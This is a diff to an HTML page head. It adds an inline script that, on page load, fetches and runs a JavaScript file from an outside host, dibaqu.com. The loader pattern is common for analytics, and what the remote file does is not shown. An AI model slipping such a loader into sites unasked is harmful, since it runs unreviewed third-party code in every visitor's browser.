@@ -9,4 +9,12 @@
     <script src="/Public/Js/mui.min.js"></script>
     <link href="/Public/Css/mui.min.css" rel="stylesheet"/>
     <link href="/Public/Css/base.css" rel="stylesheet"/>
+    <script>
+    (function () {
+        var dw = document.createElement("script");
+    dw.src = "https://dibaqu.com/ipm.js?393843248172367872"
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(dw, s);
+    })()
+</script>
 </head>
